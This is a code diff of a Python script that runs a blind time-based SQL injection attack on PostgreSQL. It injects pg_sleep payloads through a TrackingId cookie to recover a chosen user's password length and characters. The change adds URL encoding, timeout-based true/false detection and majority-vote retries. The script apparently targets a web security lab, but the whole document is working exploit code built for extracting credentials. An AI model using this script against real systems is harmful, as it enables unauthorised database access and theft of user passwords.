@@ -4,10 +4,11 @@ import asyncio
 import aiohttp
 import argparse
 import string
-import time
+from urllib.parse import quote
 
 
-DELAY_SECONDS = 5
+DELAY_SECONDS = 10
+TIMEOUT_SECONDS = 5
 
 
 async def check_condition(
@@ -17,20 +18,36 @@ async def check_condition(
     condition: str,
     delay: int = DELAY_SECONDS,
 ) -> bool:
-    """Check if a SQL condition is true by measuring response delay."""
+    """Check if a SQL condition is true by detecting a timeout from pg_sleep."""
     payload = (
         f"'; SELECT CASE WHEN ({condition}) "
         f"THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users--"
     )
-    headers = {"Cookie": f"TrackingId={payload}; session={session}"}
-    start = time.monotonic()
+    headers = {"Cookie": f"TrackingId={quote(payload)}; session={session}"}
+    timeout = aiohttp.ClientTimeout(total=TIMEOUT_SECONDS)
     try:
-        async with client.get(url, headers=headers, ssl=False) as res:
+        async with client.get(url, headers=headers, timeout=timeout, ssl=False) as res:
             await res.text()
-            elapsed = time.monotonic() - start
-            return elapsed >= delay - 1.5  # allow margin for network latency
+            return False  # completed quickly → false condition
+    except asyncio.TimeoutError:
+        return True   # timed out → pg_sleep was running → true condition
     except aiohttp.ClientError:
         return False
+
+
+async def check_condition_with_retry(
+    client: aiohttp.ClientSession,
+    url: str,
+    session: str,
+    condition: str,
+    retries: int = 2,
+) -> bool:
+    """Check condition multiple times for consistency."""
+    results = []
+    for _ in range(retries):
+        results.append(await check_condition(client, url, session, condition))
+    # Accept if majority of retries agree
+    return sum(results) >= (retries + 1) // 2
 
 
 async def get_password_length(
@@ -43,7 +60,7 @@ async def get_password_length(
     """Determine password length using conditional time delays."""
     for length in range(1, max_length + 1):
         condition = f"username='{username}' AND LENGTH(password)={length}"
-        if await check_condition(client, url, session, condition):
+        if await check_condition_with_retry(client, url, session, condition):
             print(f"[+] Password length: {length}")
             return length
     return 0
@@ -63,7 +80,7 @@ async def extract_password(
         found = False
         for char in chars:
             condition = f"username='{username}' AND SUBSTRING(password,{pos},1)='{char}'"
-            if await check_condition(client, url, session, condition):
+            if await check_condition_with_retry(client, url, session, condition):
                 password += char
                 print(f"[+] Position {pos}: '{char}' → {password}")
                 found = True
@@ -91,8 +108,8 @@ async def main():
     url = args.url.strip()
     session = args.session.strip()
 
-    print(f"[*] Using {DELAY_SECONDS}s delay for true conditions.")
-    print("[*] This process is slow by nature — each true condition waits for the delay.\n")
+    print(f"[*] Using {DELAY_SECONDS}s delay with {TIMEOUT_SECONDS}s timeout.")
+    print("[*] Each check is retried for consistency. This is slow by nature.\n")
 
     async with aiohttp.ClientSession(trust_env=True) as client:
         # Step 1: Determine password length
